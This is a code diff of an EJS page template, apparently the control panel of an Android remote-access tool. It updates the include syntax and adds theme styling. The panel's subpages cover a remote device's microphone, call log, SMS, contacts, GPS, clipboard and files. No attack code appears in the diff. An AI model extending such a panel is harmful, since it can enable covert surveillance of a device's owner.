@@ -1,44 +1,100 @@
 <!DOCTYPE html>
 <html>
 
-<% include partials/head.ejs %>
+<%- include('partials/head.ejs') %>
 
 <body>
     <script>
         var baseURL = '<%= baseURL %>';
     </script>
-    <div class="ui container">
-        <% include partials/header.ejs %>
-        <div class="ui grid">
-            <% include partials/deviceManagerMenu.ejs %>
-            <div class="twelve wide column">
+    <div class="ui container main-container">
+        <%- include('partials/header.ejs') %>
+        <div class="ui grid device-grid">
+            <%- include('partials/deviceManagerMenu.ejs') %>
+            <div class="twelve wide column content-column">
                 <script>
                     gtag('event', 'screen_view', {
                         'screen_name': '<%= page %>',
                         'app_name': 'AryanVBW'
                     });
                 </script>
-                <% 
-                    if(page === "microphone") { %><% include deviceManagerPages/microphone.ejs %><% }
-                    else if(page === "calls") { %><% include deviceManagerPages/call_log.ejs %><% }
-                    else if(page === "clipboard") { %><% include deviceManagerPages/clipboard_log.ejs %><% }
-                    else if(page === "contacts") { %><% include deviceManagerPages/contacts.ejs %><% }
-                    else if(page === "gps") { %><% include deviceManagerPages/gps.ejs %><% }
-                    else if(page === "info") { %><% include deviceManagerPages/info.ejs %><% }
-                    else if(page === "notifications") { %><% include deviceManagerPages/notification_log.ejs %><% }
-                    else if(page === "sms") { %><% include deviceManagerPages/sms_manager.ejs %><% }
-                    else if(page === "wifi") { %><% include deviceManagerPages/wifi_manager.ejs %><% }  
-                    else if(page === "apps") { %><% include deviceManagerPages/apps.ejs %><% }  
-                    else if(page === "permissions") { %><% include deviceManagerPages/permissions.ejs %><% }                    
-                    else if(page === "files") { %><% include deviceManagerPages/file_manager.ejs %><% }
-                    else if(page === "downloads") { %><% include deviceManagerPages/downloads.ejs %><% }
-                    else if(page === "notFound") { %><% include deviceManagerPages/deviceNotFound.ejs %><% }
-                    else { %><% include deviceManagerPages/noPage.ejs %><% }
-                %>
+                <div class="content-wrapper">
+                    <% 
+                        if(page === "microphone") { %><%- include('deviceManagerPages/microphone.ejs') %><% }
+                        else if(page === "calls") { %><%- include('deviceManagerPages/call_log.ejs') %><% }
+                        else if(page === "clipboard") { %><%- include('deviceManagerPages/clipboard_log.ejs') %><% }
+                        else if(page === "contacts") { %><%- include('deviceManagerPages/contacts.ejs') %><% }
+                        else if(page === "gps") { %><%- include('deviceManagerPages/gps.ejs') %><% }
+                        else if(page === "info") { %><%- include('deviceManagerPages/info.ejs') %><% }
+                        else if(page === "notifications") { %><%- include('deviceManagerPages/notification_log.ejs') %><% }
+                        else if(page === "sms") { %><%- include('deviceManagerPages/sms_manager.ejs') %><% }
+                        else if(page === "wifi") { %><%- include('deviceManagerPages/wifi_manager.ejs') %><% }  
+                        else if(page === "apps") { %><%- include('deviceManagerPages/apps.ejs') %><% }  
+                        else if(page === "permissions") { %><%- include('deviceManagerPages/permissions.ejs') %><% }                    
+                        else if(page === "files") { %><%- include('deviceManagerPages/file_manager.ejs') %><% }
+                        else if(page === "downloads") { %><%- include('deviceManagerPages/downloads.ejs') %><% }
+                        else if(page === "notFound") { %><%- include('deviceManagerPages/deviceNotFound.ejs') %><% }
+                        else { %><%- include('deviceManagerPages/noPage.ejs') %><% }
+                    %>
+                </div>
             </div>
         </div>
     </div>
-    <% include partials/footer.ejs %>
+    <%- include('partials/footer.ejs') %>
+
+    <style>
+        .main-container {
+            min-height: 100vh;
+            padding-bottom: 80px;
+            position: relative;
+        }
+        
+        [data-theme="dark"] .main-container {
+            background-color: var(--primary-bg);
+        }
+        
+        .device-grid {
+            margin-top: 20px !important;
+        }
+        
+        .content-column {
+            transition: all 0.3s ease;
+        }
+        
+        [data-theme="dark"] .content-column {
+            color: var(--text-color);
+        }
+        
+        .content-wrapper {
+            padding: 15px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        [data-theme="dark"] .content-wrapper {
+            background-color: rgba(30, 30, 30, 0.5);
+            border: 1px solid var(--highlight-color);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
+        }
+        
+        /* Terminal-style scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.1);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-color);
+            border-radius: 4px;
+        }
+        
+        [data-theme="dark"] ::-webkit-scrollbar-thumb {
+            background: var(--highlight-color);
+        }
+    </style>
 </body>
 
 </html>
